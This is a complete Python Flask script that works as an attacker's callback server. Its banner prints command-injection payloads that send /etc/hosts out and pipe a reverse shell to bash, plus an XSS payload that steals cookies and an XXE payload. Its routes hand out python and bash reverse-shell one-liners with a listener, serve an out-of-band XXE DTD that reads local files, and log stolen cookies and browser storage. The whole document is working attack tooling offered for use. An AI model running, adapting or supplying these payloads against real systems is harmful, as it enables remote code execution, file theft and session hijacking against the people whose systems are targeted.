#!/usr/bin/env python3
from flask import Flask,Response,request
import sys,logging,argparse,socket,netifaces,threading,os,select
log=logging.getLogger('werkzeug')
log.disabled=True
cli=sys.modules['flask.cli']
cli.show_server_banner=lambda*x:None
p=argparse.ArgumentParser()
p.add_argument('-i',required=True,help='IP or interface name')
a=p.parse_args()
if a.i.replace('.','').isdigit():
 ip=a.i
else:
 try:ip=netifaces.ifaddresses(a.i)[netifaces.AF_INET][0]['addr']
 except:print('Interface not found');sys.exit(1)
app=Flask(__name__)
l={}

def banner():
 print("""
\033[38;5;208m** Exfil using routes! **\033[0m
🔗: ;;curl${IFS}http://%s
💻: &&curl${IFS}http://%s/rce${IFS}-d"`cat${IFS}/etc/hosts`"
🐚: ||curl${IFS}http://%s/rev/4444|bash
🍪: <svg%%0Conload="\\u0064ocument.write('<img%%0Csrc=http://%s?c='%%2b\\u0064ocument.cookie%%2b'>')"/>
🗂️: Content-Type: text/xml <?xml version="1.0"?><!DOCTYPE x SYSTEM "http://%s/dtd"><x>&e1;</x>
"""%(ip,ip,ip,ip,ip))

def rev(p):
 s=socket.socket()
 s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
 s.bind(('0.0.0.0',p))
 s.listen(1)
 print(f'\033[92m[*] Listening for reverse shell on {p}\033[0m')
 c,a=s.accept()
 print(f'\033[92m[+] Connection from {a[0]}\033[0m')
 c.setblocking(False)
 while True:
  r,_,_=select.select([c,sys.stdin],[],[])
  if c in r:
   try:
    d=c.recv(4096)
    if not d:break
    sys.stdout.buffer.write(d)
    sys.stdout.flush()
   except:break
  if sys.stdin in r:
   d=sys.stdin.buffer.read1(4096)
   if not d:break
   try:c.send(d)
   except:break
 c.close()
 print()
 banner()

@app.route('/rce',methods=['GET','POST'])
def rce():
 v=request.get_data(as_text=True)or request.args.get('d','')
 print('----------------------------------------------------')
 print('\033[92mConnected\033[0m')
 print('Host: '+request.remote_addr)
 print('User-Agent: '+request.headers.get('User-Agent',''))
 print('Command-Output:')
 print(v)
 print('----------------------------------------------------')
 print()
 return'',204

@app.route('/rev/<int:p>')
def r(p):
 threading.Thread(target=rev,args=(p,),daemon=True).start()
 payload=f'''python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' 2>/dev/null || python -c 'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")' 2>/dev/null || bash -c "bash -i >& /dev/tcp/{ip}/{p} 0>&1"'''
 return Response(payload,mimetype='text/plain')

@app.route('/dtd')
def dtd():
 data=request.args.get('data')
 if data is None:
  f=request.args.get('file')or'/proc/self/cwd'
  l[request.remote_addr]=f
  return Response(f'<!ENTITY % file SYSTEM "file://{f}"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{ip}/dtd?data=%file;\'>">%eval;%exfil;',mimetype='application/xml')
 print('----------------------------------------------------')
 print('\033[92mConnected\033[0m')
 print('Host: '+request.remote_addr)
 print('User-Agent: '+request.headers.get('User-Agent',''))
 print('File: '+l.get(request.remote_addr,''))
 print(data)
 if l.get(request.remote_addr)=='/proc/self/cwd':
  print('\033[92mRead the file system using the route /dtd?file=<directory/file>\033[0m')
 print('----------------------------------------------------')
 print()
 return'',204

@app.route('/',methods=['GET','POST'])
def h():
 d=request.args.get('c')or request.get_data(as_text=True)or''
 print('----------------------------------------------------')
 print('\033[92mConnected\033[0m')
 print('Host: '+request.remote_addr)
 print('User-Agent: '+request.headers.get('User-Agent',''))
 print('Cookies: '+(d.split(',')[0]if d else''))
 print('localStorage: '+(d.split(',')[1]if len(d.split(','))>1 else''))
 print('sessionStorage: '+(d.split(',')[2]if len(d.split(','))>2 else''))
 print('----------------------------------------------------')
 print()
 return'',204

if __name__=="__main__":
 banner()
 app.run(host='0.0.0.0',port=80,debug=False)
